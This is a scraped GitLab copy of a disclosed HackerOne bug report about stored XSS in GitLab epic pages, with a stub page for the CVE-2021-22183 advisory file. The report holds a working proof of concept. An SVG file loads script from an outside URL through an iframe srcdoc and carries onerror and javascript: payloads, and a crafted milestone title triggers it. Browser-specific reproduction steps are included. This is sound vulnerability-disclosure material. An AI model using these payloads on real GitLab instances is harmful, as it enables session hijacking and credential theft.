=== Content from gitlab.com_9eb6847d_20250114_190415.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS in epic's pages

**[HackerOne report #1055814](https://hackerone.com/reports/1055814)** by `mike12` on 2020-12-10, assigned to [@rchan-gitlab](/rchan-gitlab "Ron Chan"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hi Gitlab!

It's possible to inject arbitrary JS code into an epic's page using the Start date and Due date.

This XSS works for:

1. gitlab.com using **Firefox** (tested in Firefox 83.0)
2. A self-hosted GitLab instance without CSP using **Safari** (tested in Safari 13.1), **Chrome** (tested in Chrome 87.0.4280.88) or **Firefox**

##### Steps to reproduce using Firefox

1. Open your browser and navigate to <https://gitlab.com>
2. Create a group and a project in it
3. Add a file named `demo.svg` to the project with the following content:

   ```
   &lt;svg id=&#34;x&#34;
        xmlns=&#34;http://www.w3.org/2000/svg&#34;
        width=&#34;100&#34;
        height=&#34;100&#34;
   &gt;
       &lt;foreignObject&gt;
           &lt;iframe xmlns=&#34;http://www.w3.org/1999/xhtml&#34;
                   srcdoc=&#39;&amp;lt;script src=https://gitlab.com/mike12-h1/csp/-/raw/master/index.js&amp;gt; &amp;lt;/script&amp;gt;&#39;&gt;&lt;/iframe&gt;
       &lt;/foreignObject&gt;

       &lt;image href=&#34;foo&#34; onerror=&#34;alert(&#39;onerror&#39;)&#34;/&gt;

       &lt;a xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xlink:href=&#34;javascript:alert(&#39;xlink:href&#39;)&#34;&gt;
           &lt;circle cx=&#34;50&#34; cy=&#34;50&#34; r=&#34;40&#34; stroke=&#34;black&#34; stroke-width=&#34;3&#34; fill=&#34;red&#34;/&gt;
           &lt;text x=&#34;50%&#34; y=&#34;50%&#34; text-anchor=&#34;middle&#34; stroke=&#34;#000000&#34; stroke-width=&#34;1px&#34; dy=&#34;.3em&#34;&gt;Click me&lt;/text&gt;
       &lt;/a&gt;
   &lt;/svg&gt;
   ```
4. Create a new epic in the group
5. Create a new issue in the project
6. Assign the created epic to the issue
7. Create a new milestone in the project

   1. Title: `&amp;lt;svg width=&amp;quot;100&amp;quot;&amp;gt;&amp;lt;use xlink:href=&amp;quot;/&lt;YOUR-GROUP-NAME&gt;/&lt;YOUR-PROJECT&gt;/-/raw/master/demo.svg#x&amp;quot; /&amp;gt;&amp;lt;/svg&amp;gt;` (Replace `&lt;YOUR-GROUP-NAME&gt;` and `&lt;YOUR-PROJECT&gt;` with your values)
   2. Specify any valid Start Date and Due Date values
8. Assign the created milestone to the issue
9. Navigate to the epic created in step 4
10. Hover your mouse over the inherited due date

[![1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0c15682e909dc1de2014aedea234b0f178cb6ea2/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64316630303364392d353933342d346166392d386633642d3765656464346139383262372f312e706e67)

##### Steps to reproduce using Safari

1. Run a self-hosted Gitlab instance
2. Repeat steps 2 through 10 from the "Steps to reproduce using Firefox" section.

##### Steps to reproduce using Chrome

1. Run a self-hosted Gitlab instance
2. Repeat steps 2 through 10 from the "Steps to reproduce using Firefox" section.
3. Click the red circle in the due date tooltip.

[![2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/224b3d61703f7f3e65ddd3ed09ef6ea4a0b8164f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61373034633363642d613334392d346162352d383131662d3131613930353536636338372f322e706e67)

[![3.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d511e97f214229f04ac6c0985542a57dc94ec253/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63356362626439612d666536362d343436652d393865652d3437663832353232393030312f332e706e67)

#### Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data, including credentials

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [2.png](https://h1.sec.gitlab.net/a/a704c3cd-a349-4ab5-811f-11a90556cc87/2.png)
* [1.png](https://h1.sec.gitlab.net/a/d1f003d9-5934-4af9-8f3d-7eedd4a982b7/1.png)
* [3.png](https://h1.sec.gitlab.net/a/c5cbbd9a-fe66-446e-98ee-47f825229001/3.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_bc04b4e3_20250114_190414.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-22183.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-22183.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-22183.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-22183.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Mar 03, 2021

  [c2d677d8](/gitlab-org/cves/-/commit/c2d677d8996a1926ed362c2db0895559778feed8)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/c2d677d8996a1926ed362c2db0895559778feed8)
  ·
  c2d677d8

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 03, 2021

  c2d677d8

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/c2d677d8996a1926ed362c2db0895559778feed8)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Mar 03, 2021

Loading


